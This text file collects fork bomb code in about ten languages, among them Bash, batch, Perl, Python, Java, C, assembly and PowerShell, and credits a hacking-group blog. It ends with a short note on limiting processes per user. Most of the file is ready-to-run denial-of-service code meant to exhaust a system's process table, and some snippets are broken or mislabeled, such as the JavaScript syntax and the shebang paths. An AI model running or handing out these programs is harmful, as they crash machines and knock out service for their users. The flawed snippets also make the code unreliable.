#fork bombs in multiple languages props to th3 r3v from da3m0n s3c https://da3m0ns3c.blogspot.com/2017/04/fork-bomb-in-several-language-implements.html

#BASH
$ :(){ :|: & };:

#.sh (Shell file)
#!/bin/bash
./$0|./$0&

#.bat (Windows bat implements)
:TOP
start "" %0
goto TOP

#~OR~
%0|%0
  #below is the same, but done in command line using ^ to escape specials:
echo %0^|%0 > forkbomb.bat
forkbomb.bat

#.pl (Perl implement)
#! /bin/perl
perl -e "fork while fork" &

#.py (Python implement)
#! /bin/py
import os
while 1:
    os.fork()

#(Java implement)
public class ForkBomb
{
 public static void main(String[] args)
  {
   while(true)
   {
Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
  }
 }
}

.js (JavaScript implement)
function bomb() {
  setTimeout function() {
   for (;;) {
    bomb();
   }
  }, 0);
}

#.c (C lang implement)
#include <unistd.h>
int main(void)
{
   while(1) {
    fork(); /* malloc can be used in order to increase the data usage */

   }
}

#.asm (Assembly, IA-32)
section .text
   global _start

_start:
   mov eax,2 ;System call for forking
   int 0x80 ;Call kernel

   jmp _start

#.ps (PowerShell implement)
while($true) {
   Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:";
   Invoke-Expression -Command 'while($true) {Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"}';}

#Mitigation.
The fork bomb's mode of operation, (or MO), is entirely encapsulated by creating new processes, one way of preventing a fork bomb from severely affecting the entire system is to limit the maximum number of processes that a single user may own. On Linux, use ulimit cmd with the below arguments: ulimit -u 30 This limits the affected user to a maximum of thirty owned processes. On PAM-enabled systems, the limit can be set in /etc/security/limits.conf
and on FreeBSD, root can set limits in
/etc/login.conf
